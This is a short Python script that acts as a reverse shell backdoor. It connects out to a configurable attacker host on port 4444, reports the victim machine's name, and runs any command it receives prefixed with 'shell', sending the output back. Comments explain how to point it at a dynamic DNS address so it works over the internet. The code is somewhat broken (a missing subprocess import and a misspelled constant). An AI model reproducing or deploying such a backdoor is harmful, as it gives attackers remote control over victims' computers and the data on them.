#!/usr/bin/python

import os
import sys
import socket

def connect():
	os.system('cls')
	global host
	global port
	global s 
	
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	port = 4444
	host = '192.168.1.152' #your local IP goes here
	#host = socket.gethostbyname('YOURDNSHOSTHERE') 
	
	try:
		s.connect((host, port))
		s.send(os.environ['COMPUTERNAME'])
	
	except:
		sys.exit()
	
def recieve():
	recieve = s.recv(1024)
	
	if recieve == 'quit':
		s.close()
	elif recieve[0:5] == 'shell':
		proc2 = subprocess.Popen(recieve[6:], shell=True, stdout=subprocess.Pipe, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		stdout_value = proc2.stdout.read() + proc2.stderr.read()
		args = stdout_value
	else:
		args = "no valid output was given"
	send(args) 

def send(args): 
	send = s.send(args)
	recieve()

connect()
recieve()
s.close()

#on line 16, if you want to use this over WAN, uncomment it and then replace YOURDNSHOSTHERE with your dynamic dns adress.
